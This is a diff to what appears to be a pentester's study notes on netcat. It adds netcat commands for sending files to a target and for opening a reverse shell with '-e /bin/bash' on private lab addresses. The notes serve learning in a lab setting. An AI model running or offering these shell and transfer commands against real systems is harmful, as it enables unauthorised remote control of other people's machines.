@@ -13,6 +13,7 @@
 
 for encodings [cyberchef](https://cyberchef.org/)  
 
+### Netcat sending files
 Listener:
 `nc -lvp 4444 > incomig.txt` nc is a symlink of netcat  
 TARGET HIGH PORTS  
@@ -24,5 +25,10 @@ Sender:
 `nc -nv 10.0.2.5 4444 < exploit.sh`  
 `n` no DNS resolution  
 
+
+### Netcat reverse shell 
+Listener:
+`nc -lvp 4444`
+Target:  
 `netcat 10.0.2.4 4444 -e /bin/bash`  
-eexec that program after connection (TESTING NEEDED)  
+`-e` execute that program after connection -> that way you can send commends directly to opened shell via TCP connection
